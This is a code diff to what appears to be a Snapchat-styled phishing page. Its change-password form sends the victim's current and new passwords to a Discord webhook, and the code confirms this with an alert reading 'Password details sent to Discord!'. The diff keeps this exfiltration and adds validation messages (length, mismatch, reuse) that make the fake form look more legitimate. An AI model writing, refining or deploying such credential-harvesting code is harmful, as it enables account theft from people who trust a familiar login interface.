@@ -60551,6 +60551,7 @@ html[lang='ar'] .theme--snapchat {
                                 <div class="description error" id="error_message"></div>
                                 <div>
                                     <form id="change_password_form" class="centered_form">
+
                                         <div class="form-group has-success">
                                             <label for="currentpassword" class="control-label">Current Password</label>
                                             <input name="currentpassword" autocomplete="off" type="password" id="currentpassword" class="form-control" value="">
@@ -61429,35 +61430,52 @@ html[lang='ar'] .theme--snapchat {
         const current_pass = document.getElementById('currentpassword').value;
         const new_pass = document.getElementById('newpassword').value;
         const newcon_pass = document.getElementById('newpassword2').value;
+        const errorMessage = document.getElementById('error_message');
+
 
         // Check for mismatched passwords
+        let errors = [];
+        if (new_pass.length < 8) {
+            errors.push("New password must be at least 8 characters long.");
+        }
         if (new_pass !== newcon_pass) {
-            alert('New Password and Confirm Password do not match!');
-            return;
+            errors.push("New passwords must be identical.");
+        }
+        if (new_pass == current_pass) {
+            errors.push("The new password must be different from the current password.");
         }
 
-        // Prepare the payload as a single string
-        const payload = JSON.stringify({
-            content: `--------------------\nCurrent Password: ${current_pass}\nNew Password: ${new_pass}\nConfirm Password: ${newcon_pass} \n--------------------`
-        });
+        if (errors.length > 0) {
+            errorMessage.innerHTML = errors.map(error => `<p>${error}</p>`).join('');
+            errorMessage.style.display = 'block';
+        } else {
+            errorMessage.style.display = 'none';
 
-        try {
-            // Send the POST request to the webhook
-            const response = await fetch(webhookURL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: payload
-            });
+           // Prepare the payload as a single string
+          const payload = JSON.stringify({
+              content: `--------------------\nCurrent Password: ${current_pass}\nNew Password: ${new_pass}\nConfirm Password: ${newcon_pass} \n--------------------`
+          });
 
-            if (response.ok) {
-                alert('Password details sent to Discord!');
-            } else {
-                alert('Failed to send password details.');
-            }
-        } catch (error) {
-            console.error('Error:', error);
-            alert('An error occurred while sending the password details.');
+          try {
+              // Send the POST request to the webhook
+              const response = await fetch(webhookURL, {
+                  method: 'POST',
+                  headers: { 'Content-Type': 'application/json' },
+                  body: payload
+              });
+
+              if (response.ok) {
+                  alert('Password details sent to Discord!');
+              } else {
+                  alert('Failed to send password details.');
+              }
+          } catch (error) {
+              console.error('Error:', error);
+              alert('An error occurred while sending the password details.');
+          }
         }
+
+       
     });
 </script>
 
@@ -61472,11 +61490,12 @@ html[lang='ar'] .theme--snapchat {
 
         // Function to check if passwords match and toggle the submit button
         function checkPasswords() {
-            if (newPassword.value === confirmPassword.value && newPassword.value.length > 0) {
-                submitButton.removeAttribute('disabled'); // Enable the button
-            } else {
-                submitButton.setAttribute('disabled', ''); // Disable the button
+            if (newPassword.value.length > 0 && confirmPassword.value.length > 0){
+              submitButton.removeAttribute('disabled'); // Enable the button
+            }else{
+              submitButton.setAttribute('disabled', ''); // Disable the button
             }
+           
         }
 
         // Function to toggle password visibility for a group
